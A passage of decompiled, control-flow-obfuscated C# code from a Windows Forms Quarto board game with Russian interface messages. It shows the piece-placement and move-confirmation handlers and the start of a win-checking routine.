		Graphics graphics_ = default(Graphics);
		bool flag = default(bool);
		int num4 = default(int);
		int num3 = default(int);
		int num5 = default(int);
		while (true)
		{
			int num = -1913105157;
			while (true)
			{
				uint num2;
				int num11;
				switch ((num2 = (uint)num ^ 0xFC0A7CCBu) % 27u)
				{
				case 25u:
				{
					int num10;
					if (num6 >= 4)
					{
						num = -1116683398;
						num10 = -1116683398;
					}
					else
					{
						num = -474840539;
						num10 = -474840539;
					}
					continue;
				}
				case 24u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)((num2 * 717926166) ^ 0x1C36C6D8);
					continue;
				case 23u:
					Form1.smethod_45(graphics_);
					num = ((int)num2 * -818116712) ^ -1120152737;
					continue;
				case 22u:
				{
					int num8;
					int num9;
					if (flag)
					{
						num8 = -59443370;
						num9 = -59443370;
					}
					else
					{
						num8 = -1733989299;
						num9 = -1733989299;
					}
					num = num8 ^ ((int)num2 * -1816310602);
					continue;
				}
				case 20u:
					if (board[num4, num3] == null)
					{
						num = -798543754;
						num11 = -798543754;
						continue;
					}
					goto IL_009c;
				case 19u:
					num4 = Form1.smethod_39(e) / size;
					num = ((int)num2 * -469571008) ^ 0x5E59EA11;
					continue;
				case 18u:
					num = (int)((num2 * 1319656237) ^ 0x50BEC17F);
					continue;
				case 17u:
					num3 = Form1.smethod_38(e) / size;
					num = ((int)num2 * -1036781032) ^ 0x1DC8449A;
					continue;
				case 16u:
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num = ((int)num2 * -2147209123) ^ 0x69C67E1E;
						continue;
					}
					goto IL_009c;
				case 15u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = ((int)num2 * -1344027573) ^ 0x4919A902;
					continue;
				case 14u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num5, num6]), num3 * size + 4, num4 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)((num2 * 1711395826) ^ 0x4C98EDDF);
					continue;
				case 13u:
					num = (int)(num2 * 1643613355) ^ -370308700;
					continue;
				case 12u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = ((int)num2 * -1411113738) ^ -2127310964;
					continue;
				case 11u:
					Paint_Board();
					num = ((int)num2 * -1365208290) ^ -5298401;
					continue;
				case 10u:
					num = (int)(num2 * 1719100725) ^ -1266344424;
					continue;
				case 9u:
				{
					int num7;
					if (num5 >= 4)
					{
						num = -1137555885;
						num7 = -1137555885;
					}
					else
					{
						num = -573152020;
						num7 = -573152020;
					}
					continue;
				}
				case 8u:
					flag = Form1.smethod_41((Control)(object)borderBox[num5, num6]) == Color.Blue;
					num = -471834438;
					continue;
				case 7u:
					num6 = 0;
					num = -1828066743;
					continue;
				case 6u:
					num5++;
					num = (int)((num2 * 1711835988) ^ 0x48FE4AF9);
					continue;
				case 5u:
					num6++;
					num = -1828066743;
					continue;
				case 4u:
					num5 = 0;
					num = (int)(num2 * 615545780) ^ -2015490245;
					continue;
				case 3u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num3 + 0.05f) * (float)size, ((float)num4 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -116865915) ^ -1541541586;
					continue;
				case 2u:
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num = (int)(num2 * 1154940138) ^ -740592246;
					continue;
				case 1u:
					num = ((int)num2 * -1696410337) ^ -217732813;
					continue;
				case 0u:
					num = (int)((num2 * 1529592389) ^ 0x24FFB689);
					continue;
				default:
					return;
				case 26u:
					break;
				case 21u:
					return;
					IL_009c:
					num = -1137555885;
					num11 = -1137555885;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_1474: Unknown result type (might be due to invalid IL or missing references)
		//IL_14a2: Expected O, but got Unknown
		Form1.smethod_7((Control)(object)button2, bool_0: false);
		int num22 = default(int);
		int num35 = default(int);
		int num36 = default(int);
		int num41 = default(int);
		bool flag14 = default(bool);
		Figurine[,] array = default(Figurine[,]);
		int num31 = default(int);
		int num32 = default(int);
		int num15 = default(int);
		int num16 = default(int);
		int num6 = default(int);
		int num8 = default(int);
		int num9 = default(int);
		bool flag10 = default(bool);
		int num17 = default(int);
		int num21 = default(int);
		bool flag12 = default(bool);
		int num13 = default(int);
		int num14 = default(int);
		int num5 = default(int);
		bool flag2 = default(bool);
		int num10 = default(int);
		int num11 = default(int);
		int num23 = default(int);
		bool flag6 = default(bool);
		int num12 = default(int);
		int num4 = default(int);
		bool flag11 = default(bool);
		bool flag = default(bool);
		bool flag7 = default(bool);
		Figurine[,] array2 = default(Figurine[,]);
		bool flag5 = default(bool);
		Graphics graphics_ = default(Graphics);
		bool flag15 = default(bool);
		bool flag4 = default(bool);
		Figurine[,] array3 = default(Figurine[,]);
		bool flag9 = default(bool);
		bool flag13 = default(bool);
		bool flag8 = default(bool);
		bool flag3 = default(bool);
		while (true)
		{
			int num = -888848419;
			while (true)
			{
				uint num2;
				int num61;
				int num20;
				int num44;
				int num50;
				switch ((num2 = (uint)num ^ 0xBFAC8C06u) % 178u)
				{
				case 177u:
					num22 = 0;
					num = (int)(num2 * 1818347142) ^ -516390579;
					continue;
				case 176u:
					Form1.smethod_30((Control)(object)borderBox[num35, num36]);
					num = (int)((num2 * 1672972405) ^ 0x5B93A375);
					continue;
				case 175u:
					if (num41 >= 9)
					{
						num = -794153280;
						num61 = -794153280;
						continue;
					}
					goto IL_0056;
				case 174u:
					num = (int)(num2 * 568251457) ^ -958192149;
					continue;
				case 173u:
					num = (int)(num2 * 1528767536) ^ -1285095313;
					continue;
				case 172u:
					flag14 = array[num31, num32] == null;
					num = -1116133066;
					continue;
				case 171u:
					storage[num15, num16] = null;
					num = ((int)num2 * -991192765) ^ -1401870266;
					continue;
				case 170u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					step++;
					num = ((int)num2 * -330463327) ^ -1411559688;
					continue;
				case 169u:
					num15 = num6;
					num = ((int)num2 * -595990560) ^ -1942079040;
					continue;
				case 168u:
					Form1.smethod_5((Control)(object)borderBox[num8, num9], Color.White);
					num = (int)(num2 * 925412342) ^ -700726303;
					continue;
				case 167u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = ((int)num2 * -179823726) ^ -864559027;
					continue;
				case 166u:
					flag10 = num17 < 4;
					num = -442294205;
					continue;
				case 165u:
					num = -1245209502;
					continue;
				case 164u:
					num = ((int)num2 * -707486059) ^ 0x79F6C2C7;
					continue;
				case 163u:
					num21 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -743994310) ^ 0x24CDE2A2;
					continue;
				case 162u:
				{
					int num64;
					int num65;
					if (flag14)
					{
						num64 = 659308247;
						num65 = 659308247;
					}
					else
					{
						num64 = 226645876;
						num65 = 226645876;
					}
					num = num64 ^ ((int)num2 * -633521001);
					continue;
				}
				case 161u:
					num = ((int)num2 * -158661754) ^ -1227090134;
					continue;
				case 160u:
					num = -1192022243;
					continue;
				case 159u:
					if (!flag12)
					{
						num = (int)((num2 * 1135256178) ^ 0x5864ABC7);
						continue;
					}
					goto IL_0056;
				case 158u:
					num17++;
					num = (int)((num2 * 1644737836) ^ 0x398AB35C);
					continue;
				case 157u:
					num13 = num6;
					num14 = num5;
					num = ((int)num2 * -1934098109) ^ -307858751;
					continue;
				case 156u:
					flag2 = board[num10, num11] == null;
					num = -189781397;
					continue;
				case 155u:
					num = (int)((num2 * 117672296) ^ 0x66041BD7);
					continue;
				case 154u:
					Form1.smethod_47(1000);
					num = (int)((num2 * 1716092896) ^ 0x471FCB63);
					continue;
				case 153u:
					num = (int)((num2 * 38495283) ^ 0x15D7E2D7);
					continue;
				case 152u:
					num23 = 0;
					num = -1677569161;
					continue;
				case 151u:
					num = -380137200;
					continue;
				case 150u:
					flag6 = board[num12, num21] != null;
					num = ((int)num2 * -1981245312) ^ 0x65639F26;
					continue;
				case 149u:
					num13 = 0;
					num14 = 0;
					num = (int)((num2 * 1667581413) ^ 0x695BA04C);
					continue;
				case 148u:
					Form1.smethod_5((Control)(object)borderBox[num4, num17], Color.LimeGreen);
					num = ((int)num2 * -869438283) ^ -2139754665;
					continue;
				case 147u:
					board[num12, num21] = new Figurine(storage[num8, num9]);
					num = (int)(num2 * 668021059) ^ -1880154833;
					continue;
				case 146u:
					flag11 = num10 < 4;
					num = -1972681590;
					continue;
				case 144u:
					num32 = 0;
					num = -1152811352;
					continue;
				case 143u:
					num = -16233083;
					continue;
				case 142u:
					if (!Stop(board))
					{
						num = ((int)num2 * -1660900284) ^ 0x5C277513;
						continue;
					}
					goto IL_03bb;
				case 141u:
				{
					int num47;
					if (num31 >= 4)
					{
						num = -759562964;
						num47 = -759562964;
					}
					else
					{
						num = -1856724828;
						num47 = -1856724828;
					}
					continue;
				}
				case 140u:
					num5++;
					num = -1487169478;
					continue;
				case 139u:
					num15 = 0;
					num = (int)(num2 * 135902161) ^ -1172116736;
					continue;
				case 138u:
				{
					int num39;
					int num40;
					if (flag)
					{
						num39 = -1514315049;
						num40 = -1514315049;
					}
					else
					{
						num39 = -950202921;
						num40 = -950202921;
					}
					num = num39 ^ (int)(num2 * 934189883);
					continue;
				}
				case 137u:
					num = ((int)num2 * -277217964) ^ -1581748531;
					continue;
				case 136u:
				{
					int num29;
					int num30;
					if (flag7)
					{
						num29 = 220014791;
						num30 = 220014791;
					}
					else
					{
						num29 = 648149427;
						num30 = 648149427;
					}
					num = num29 ^ (int)(num2 * 542572346);
					continue;
				}
				case 135u:
					num31 = 0;
					num = (int)((num2 * 920877901) ^ 0x5EE2F3F6);
					continue;
				case 134u:
				{
					int num26;
					if (num11 < 4)
					{
						num = -137469194;
						num26 = -137469194;
					}
					else
					{
						num = -1426774580;
						num26 = -1426774580;
					}
					continue;
				}
				case 133u:
					num11++;
					num = -1277470510;
					continue;
				case 132u:
					num = -2071752789;
					continue;
				case 131u:
					array[num12, num21] = new Figurine(storage[num8, num9]);
					num = (int)((num2 * 615737361) ^ 0x7FD79A52);
					continue;
				case 130u:
					num20 = (Standoff(array2) ? 1 : 0);
					goto IL_0505;
				case 129u:
					Form1.smethod_30((Control)(object)pictureBox[num8, num9]);
					board[num10, num11] = new Figurine(storage[num8, num9]);
					storage[num8, num9] = null;
					num = (int)(num2 * 1719759791) ^ -136484348;
					continue;
				case 128u:
					num = (int)(num2 * 791392775) ^ -812796312;
					continue;
				case 127u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					num = ((int)num2 * -1411555592) ^ 0x29BE1CEC;
					continue;
				case 126u:
					num4 = 0;
					num = (int)(num2 * 1324514553) ^ -1406573333;
					continue;
				case 125u:
					Form1.smethod_30((Control)(object)borderBox[num4, num17]);
					num = ((int)num2 * -281223059) ^ 0x17ED22F9;
					continue;
				case 124u:
					num17 = 0;
					num = -1900344767;
					continue;
				case 123u:
					num = ((int)num2 * -798741770) ^ -216281122;
					continue;
				case 122u:
					num35 = Form1.smethod_33(rnd, 4);
					num36 = Form1.smethod_33(rnd, 4);
					if (storage[num35, num36] != null)
					{
						num = (int)((num2 * 624868730) ^ 0x3AF355BB);
						continue;
					}
					num44 = 1;
					goto IL_063f;
				case 121u:
				{
					int num62;
					int num63;
					if (flag5)
					{
						num62 = -2080861330;
						num63 = -2080861330;
					}
					else
					{
						num62 = -2074248725;
						num63 = -2074248725;
					}
					num = num62 ^ (int)(num2 * 927458000);
					continue;
				}
				case 120u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num21 + 0.05f) * (float)size, ((float)num12 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)(num2 * 1242088604) ^ -1316376319;
					continue;
				case 119u:
				{
					int num59;
					int num60;
					if (Standoff(board))
					{
						num59 = 538272427;
						num60 = 538272427;
					}
					else
					{
						num59 = 18439314;
						num60 = 18439314;
					}
					num = num59 ^ ((int)num2 * -1645939982);
					continue;
				}
				case 118u:
					num10++;
					num = ((int)num2 * -767611718) ^ -1525396764;
					continue;
				case 117u:
				{
					int num57;
					int num58;
					if (Form1.smethod_46((Control)(object)pictureBox1))
					{
						num57 = -1131532253;
						num58 = -1131532253;
					}
					else
					{
						num57 = -2007287416;
						num58 = -2007287416;
					}
					num = num57 ^ ((int)num2 * -292643157);
					continue;
				}
				case 116u:
				{
					int num55;
					int num56;
					if (flag15)
					{
						num55 = 1000777543;
						num56 = 1000777543;
					}
					else
					{
						num55 = 1661290801;
						num56 = 1661290801;
					}
					num = num55 ^ ((int)num2 * -2141648723);
					continue;
				}
				case 115u:
					Form1.smethod_30((Control)(object)borderBox[num8, num9]);
					num = ((int)num2 * -896741640) ^ 0x3D727913;
					continue;
				case 114u:
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					num = (int)((num2 * 863490009) ^ 0x21C945FD);
					continue;
				case 113u:
				{
					int num53;
					int num54;
					if (!flag4)
					{
						num53 = -536471511;
						num54 = -536471511;
					}
					else
					{
						num53 = -751252733;
						num54 = -751252733;
					}
					num = num53 ^ ((int)num2 * -1568455038);
					continue;
				}
				case 112u:
					Form1.smethod_15(timer1);
					num = -1587868653;
					continue;
				case 111u:
					num = ((int)num2 * -834141939) ^ -666770459;
					continue;
				case 110u:
					num5 = 0;
					num = -614034787;
					continue;
				case 109u:
					array3[num31, num32] = new Figurine(storage[num35, num36]);
					flag7 = Stop(array3);
					num = (int)((num2 * 1709625469) ^ 0x15543623);
					continue;
				case 108u:
					Form1.smethod_30((Control)(object)pictureBox[num6, num5]);
					num = ((int)num2 * -1686931571) ^ 0x4C8B2A9E;
					continue;
				case 107u:
					flag9 = num22 < 4;
					num = -1468824815;
					continue;
				case 106u:
					num = ((int)num2 * -1383325267) ^ 0x6D750F72;
					continue;
				case 105u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = ((int)num2 * -1546099914) ^ 0x60DCD8DE;
					continue;
				case 104u:
					num = ((int)num2 * -993687702) ^ -198229071;
					continue;
				case 103u:
					num = ((int)num2 * -1777001861) ^ -273356221;
					continue;
				case 102u:
					num = (int)((num2 * 1385727746) ^ 0x59665295);
					continue;
				case 101u:
					num = (int)((num2 * 603982724) ^ 0x24E0C184);
					continue;
				case 100u:
					num32++;
					num = -1152811352;
					continue;
				case 99u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)(num2 * 288425478) ^ -1513679553;
					continue;
				case 98u:
					num10 = 0;
					num = ((int)num2 * -570492787) ^ -440594914;
					continue;
				case 97u:
					Form1.smethod_47(200);
					num = ((int)num2 * -764189017) ^ 0x6AEC270;
					continue;
				case 96u:
				{
					int num52;
					if (num23 < 4)
					{
						num = -1237680303;
						num52 = -1237680303;
					}
					else
					{
						num = -199337130;
						num52 = -199337130;
					}
					continue;
				}
				case 95u:
				{
					int num51;
					if (num4 < 4)
					{
						num = -1223248794;
						num51 = -1223248794;
					}
					else
					{
						num = -643896056;
						num51 = -643896056;
					}
					continue;
				}
				case 94u:
					Form1.smethod_20(pictureBox[num8, num9], (Image)null);
					Form1.smethod_30((Control)(object)pictureBox[num8, num9]);
					num = (int)(num2 * 1790123360) ^ -1767671491;
					continue;
				case 93u:
					num6++;
					num = (int)((num2 * 1382133061) ^ 0x65043393);
					continue;
				case 92u:
					num16 = num5;
					Form1.smethod_5((Control)(object)borderBox[num6, num5], Color.White);
					num = (int)((num2 * 172632190) ^ 0x276D77A8);
					continue;
				case 91u:
					if (num35 == num8)
					{
						num = ((int)num2 * -1216441324) ^ 0xF6B7F0A;
						continue;
					}
					num44 = 0;
					goto IL_063f;
				case 90u:
					Form1.smethod_30((Control)(object)borderBox[num6, num5]);
					num = (int)(num2 * 444817424) ^ -1709782620;
					continue;
				case 89u:
					num16 = 0;
					num = (int)((num2 * 622833868) ^ 0x6D20271D);
					continue;
				case 88u:
					flag13 = num6 < 4;
					num = -323274292;
					continue;
				case 87u:
					if (!Standoff(board))
					{
						num = -322733525;
						num50 = -322733525;
						continue;
					}
					goto IL_03bb;
				case 86u:
					num = ((int)num2 * -71180087) ^ 0x1D4C1208;
					continue;
				case 85u:
				{
					int num48;
					int num49;
					if (!flag10)
					{
						num48 = 1728364684;
						num49 = 1728364684;
					}
					else
					{
						num48 = 1514328431;
						num49 = 1514328431;
					}
					num = num48 ^ ((int)num2 * -1376007629);
					continue;
				}
				case 84u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num8, num9]), num21 * size + 4, num12 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -2086845277) ^ 0xD3754D8;
					continue;
				case 83u:
					num = -156633052;
					continue;
				case 82u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num8, num9]), num11 * size + 4, num10 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)(num2 * 718377663) ^ -873791269;
					continue;
				case 81u:
					Form1.smethod_30((Control)(object)borderBox[num8, num9]);
					Form1.smethod_20(pictureBox[num8, num9], (Image)null);
					num = (int)(num2 * 617175365) ^ -407383634;
					continue;
				case 80u:
				{
					int num45;
					int num46;
					if (flag13)
					{
						num45 = 1380808746;
						num46 = 1380808746;
					}
					else
					{
						num45 = 648555401;
						num46 = 648555401;
					}
					num = num45 ^ ((int)num2 * -1523576709);
					continue;
				}
				case 79u:
					num = -122546997;
					continue;
				case 78u:
					num = ((int)num2 * -1535122589) ^ -1558327322;
					continue;
				case 77u:
					flag12 = true;
					num = (int)(num2 * 86238617) ^ -231015702;
					continue;
				case 76u:
					num = ((int)num2 * -1594771797) ^ -272406431;
					continue;
				case 75u:
					num = (int)((num2 * 431586689) ^ 0x1E87C079);
					continue;
				case 74u:
					num44 = ((num36 == num9) ? 1 : 0);
					goto IL_063f;
				case 73u:
					num = (int)((num2 * 142535948) ^ 0x7124C083);
					continue;
				case 72u:
					num41++;
					flag12 = false;
					num = (int)((num2 * 2020968911) ^ 0x28DB9CCD);
					continue;
				case 71u:
					num9 = 0;
					num = (int)((num2 * 921920615) ^ 0x4B9A9B3);
					continue;
				case 70u:
				{
					int num42;
					int num43;
					if (!flag11)
					{
						num42 = -293038975;
						num43 = -293038975;
					}
					else
					{
						num42 = -684268135;
						num43 = -684268135;
					}
					num = num42 ^ (int)(num2 * 1337938335);
					continue;
				}
				case 69u:
					num41 = 0;
					num = (int)((num2 * 866845093) ^ 0xA21512B);
					continue;
				case 68u:
					Form1.smethod_30((Control)(object)richTextBox1);
					num = (int)((num2 * 1412817027) ^ 0x72C0DECA);
					continue;
				case 67u:
				{
					int num37;
					int num38;
					if (!flag8)
					{
						num37 = -1876990228;
						num38 = -1876990228;
					}
					else
					{
						num37 = -1304527587;
						num38 = -1304527587;
					}
					num = num37 ^ (int)(num2 * 105464819);
					continue;
				}
				case 66u:
					num = -1761312169;
					continue;
				case 65u:
					num = (int)((num2 * 1960205271) ^ 0x53B4B7AE);
					continue;
				case 64u:
					Form1.smethod_5((Control)(object)borderBox[num8, num9], Color.White);
					num = (int)((num2 * 1910122458) ^ 0x7C304BB4);
					continue;
				case 63u:
					num = ((int)num2 * -860900619) ^ 0x5F8AE167;
					continue;
				case 62u:
					num22++;
					num = (int)((num2 * 1455078617) ^ 0x7F47658B);
					continue;
				case 61u:
					num6 = 0;
					num = (int)((num2 * 3512759) ^ 0xC95AF17);
					continue;
				case 60u:
					storage[num8, num9] = null;
					Form1.smethod_5((Control)(object)borderBox[num35, num36], Color.Blue);
					num = (int)(num2 * 158433699) ^ -1532430254;
					continue;
				case 59u:
					num4++;
					num = ((int)num2 * -1471060518) ^ -979535989;
					continue;
				case 58u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = -1426801796;
					continue;
				case 57u:
					num = (int)((num2 * 737165985) ^ 0x1A0076AC);
					continue;
				case 56u:
					Form1.smethod_20(pictureBox[num6, num5], (Image)null);
					num = ((int)num2 * -1053593513) ^ -334643912;
					continue;
				case 55u:
				{
					int num33;
					int num34;
					if (flag9)
					{
						num33 = -1630586604;
						num34 = -1630586604;
					}
					else
					{
						num33 = -1019731277;
						num34 = -1019731277;
					}
					num = num33 ^ (int)(num2 * 864605624);
					continue;
				}
				case 54u:
					array2 = (Figurine[,])Form1.smethod_48((Array)board);
					array2[num10, num11] = new Figurine(storage[num8, num9]);
					num = (int)(num2 * 59505817) ^ -929871024;
					continue;
				case 53u:
					num31++;
					num = ((int)num2 * -706534774) ^ 0x2BDF62F7;
					continue;
				case 52u:
					num = ((int)num2 * -19917547) ^ 0x343CF808;
					continue;
				case 51u:
					(menu as Form3).ContinueLock();
					num = (int)(num2 * 1804959797) ^ -1270337333;
					continue;
				case 50u:
					flag8 = num32 < 4;
					num = -339243451;
					continue;
				case 49u:
					num = ((int)num2 * -409900922) ^ -926047036;
					continue;
				case 48u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num11 + 0.05f) * (float)size, ((float)num10 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)(num2 * 1122052958) ^ -1243500464;
					continue;
				case 47u:
					num = -1791172258;
					continue;
				case 46u:
				{
					int num27;
					int num28;
					if (flag6)
					{
						num27 = -1837442565;
						num28 = -1837442565;
					}
					else
					{
						num27 = -1787370091;
						num28 = -1787370091;
					}
					num = num27 ^ ((int)num2 * -859137955);
					continue;
				}
				case 45u:
					num = (int)((num2 * 1269485409) ^ 0x4209261A);
					continue;
				case 44u:
					num = (int)(num2 * 1420819545) ^ -695528729;
					continue;
				case 43u:
					num = ((int)num2 * -25891245) ^ -2080848674;
					continue;
				case 42u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = (int)((num2 * 1377394935) ^ 0x6FC14126);
					continue;
				case 41u:
					step++;
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					Form1.smethod_30((Control)(object)label2);
					num = (int)((num2 * 1218024574) ^ 0x1A49D563);
					continue;
				case 40u:
					num8 = 0;
					num = (int)(num2 * 115926140) ^ -1786129891;
					continue;
				case 39u:
				{
					int num24;
					int num25;
					if (!flag3)
					{
						num24 = 1777635552;
						num25 = 1777635552;
					}
					else
					{
						num24 = 1215348331;
						num25 = 1215348331;
					}
					num = num24 ^ ((int)num2 * -1075130553);
					continue;
				}
				case 38u:
					flag5 = Form1.smethod_41((Control)(object)borderBox[num4, num17]) == Color.Red;
					num = (int)((num2 * 186265957) ^ 0x7C7F5EED);
					continue;
				case 37u:
					num = ((int)num2 * -105397521) ^ 0x3F4A5CED;
					continue;
				case 36u:
					num = (int)((num2 * 908195975) ^ 0x1B5E85F8);
					continue;
				case 35u:
					Paint_Board();
					num = ((int)num2 * -1764801464) ^ -1147880050;
					continue;
				case 34u:
					num23++;
					num = ((int)num2 * -1704780699) ^ 0x7E36826A;
					continue;
				case 33u:
					num = ((int)num2 * -168153858) ^ -410824292;
					continue;
				case 32u:
					num = -1628506740;
					continue;
				case 31u:
					num = -32509320;
					continue;
				case 30u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = (int)((num2 * 351010545) ^ 0x5A81F9F3);
					continue;
				case 29u:
					num = ((int)num2 * -416343518) ^ -531618960;
					continue;
				case 28u:
					num = (int)((num2 * 1572282349) ^ 0x2F4A4414);
					continue;
				case 27u:
					array3 = (Figurine[,])Form1.smethod_48((Array)array);
					num = (int)(num2 * 1682143848) ^ -413880009;
					continue;
				case 25u:
					Form1.smethod_7((Control)(object)pictureBox[num22, num23], bool_0: true);
					num = -949008785;
					continue;
				case 24u:
					num = (int)(num2 * 726273805) ^ -1692751041;
					continue;
				case 23u:
					num = (int)(num2 * 911768391) ^ -902113317;
					continue;
				case 22u:
					if (!Stop(array2))
					{
						num = ((int)num2 * -1076971321) ^ -1191149354;
						continue;
					}
					num20 = 1;
					goto IL_0505;
				case 21u:
					num11 = 0;
					num = -1771669419;
					continue;
				case 20u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)((num2 * 1556650665) ^ 0x5F6480BB);
					continue;
				case 19u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = ((int)num2 * -1782280436) ^ 0x7445802E;
					continue;
				case 18u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)((num2 * 836698961) ^ 0x4256D18F);
					continue;
				case 17u:
					Form1.smethod_47(200);
					num = (int)((num2 * 1590526535) ^ 0x5CE42A31);
					continue;
				case 16u:
					flag4 = Form1.smethod_41((Control)(object)borderBox[num6, num5]) == Color.Blue;
					num = ((int)num2 * -1354922856) ^ 0x155886FB;
					continue;
				case 15u:
					array = (Figurine[,])Form1.smethod_48((Array)board);
					num = (int)(num2 * 1547059723) ^ -562184700;
					continue;
				case 14u:
					num = ((int)num2 * -1696493951) ^ 0x53020C1A;
					continue;
				case 13u:
				{
					int num18;
					int num19;
					if (flag2)
					{
						num18 = 1012329372;
						num19 = 1012329372;
					}
					else
					{
						num18 = 94610547;
						num19 = 94610547;
					}
					num = num18 ^ (int)(num2 * 746479768);
					continue;
				}
				case 12u:
					num8 = num4;
					num9 = num17;
					num = (int)((num2 * 805350763) ^ 0x2A359277);
					continue;
				case 11u:
					Form1.smethod_7((Control)(object)pictureBox[num4, num17], bool_0: false);
					num = ((int)num2 * -597154865) ^ -1694569531;
					continue;
				case 10u:
					num = (int)(num2 * 1380381769) ^ -647031460;
					continue;
				case 9u:
					board[num13, num14] = new Figurine(storage[num15, num16]);
					num = ((int)num2 * -452191049) ^ 0x7521F454;
					continue;
				case 8u:
					flag = num5 < 4;
					num = -899030076;
					continue;
				case 7u:
					num = (int)(num2 * 1652534510) ^ -343683627;
					continue;
				case 6u:
					num12 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -90686348) ^ -1532619143;
					continue;
				case 5u:
				{
					int num7;
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num5 * size + size / 2, (int)(((float)num6 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0))
					{
						num = -655650422;
						num7 = -655650422;
					}
					else
					{
						num = -492483236;
						num7 = -492483236;
					}
					continue;
				}
				case 4u:
					Form1.smethod_15(timer1);
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -2055886873) ^ 0x59CEF5F2;
					continue;
				case 3u:
				{
					int num3;
					if (!Standoff(board))
					{
						num = -46485212;
						num3 = -46485212;
					}
					else
					{
						num = -898165294;
						num3 = -898165294;
					}
					continue;
				}
				case 2u:
					num = (int)(num2 * 932172037) ^ -776811830;
					continue;
				case 1u:
					num = (int)((num2 * 1059558255) ^ 0x7A942DC5);
					continue;
				case 0u:
					num = (int)((num2 * 44881731) ^ 0x3D940A6C);
					continue;
				default:
					return;
				case 26u:
					break;
				case 145u:
					return;
					IL_0505:
					flag3 = (byte)num20 != 0;
					num = -1958004619;
					continue;
					IL_03bb:
					num = -2119530357;
					num50 = -2119530357;
					continue;
					IL_0056:
					num = -607349196;
					num61 = -607349196;
					continue;
					IL_063f:
					flag15 = (byte)num44 != 0;
					num = -2142161540;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		int num5 = default(int);
		bool flag4 = default(bool);
		bool flag = default(bool);
		bool result = default(bool);
		bool flag3 = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = 1287342922;
			while (true)
			{
				uint num2;
				int num6;
				int num11;
				switch ((num2 = (uint)num ^ 0x5CF74311u) % 77u)
				{
				case 76u:
				{
					int num29;
					int num30;
					if (mem[num5, 0] == null)
					{
						num29 = 110000770;
						num30 = 110000770;
					}
					else
					{
						num29 = 2026658380;
						num30 = 2026658380;
					}
					num = num29 ^ (int)(num2 * 2044925163);
					continue;
				}
				case 75u:
				{
					int num18;
					int num19;
					if (mem[1, 2].Point == mem[2, 1].Point)
					{
						num18 = -2005757010;
						num19 = -2005757010;
					}
					else
					{
						num18 = -609389204;
						num19 = -609389204;
					}
					num = num18 ^ (int)(num2 * 503858090);
					continue;
				}
				case 74u:
				{
					int num64;
					int num65;
					if (mem[1, 1].Point == mem[2, 2].Point)
					{
						num64 = 1162010153;
						num65 = 1162010153;
					}
					else
					{
						num64 = 732829662;
						num65 = 732829662;
					}
					num = num64 ^ ((int)num2 * -445144085);
					continue;
				}
				case 73u:
				{
					int num37;
					int num38;
					if (mem[1, 1] == null)
					{
						num37 = -615907387;
						num38 = -615907387;
					}
					else
					{
						num37 = -1061854780;
						num38 = -1061854780;
					}
					num = num37 ^ ((int)num2 * -655542582);
					continue;
				}
				case 72u:
					if (mem[2, num5].Big != mem[3, num5].Big)
					{
						num = (int)((num2 * 421549238) ^ 0x2695085A);
						continue;
					}
					goto IL_0115;
				case 71u:
				{
					int num23;
					int num24;
					if (mem[1, num5].Dark != mem[2, num5].Dark)
					{
						num23 = 241090584;
						num24 = 241090584;
					}
					else
					{
						num23 = 1771125887;
						num24 = 1771125887;
					}
					num = num23 ^ ((int)num2 * -1166695223);
					continue;
				}
				case 70u:
					if (mem[1, num5].Square == mem[2, num5].Square)
					{
						num = (int)(num2 * 492495585) ^ -1216094114;
						continue;
					}
					goto IL_0191;
				case 69u:
					flag4 = num5 < 4;
					num = 2135589045;
					continue;
				case 68u:
				{
					int num57;
					if (mem[num5, 0].Square != mem[num5, 1].Square)
					{
						num = 128646968;
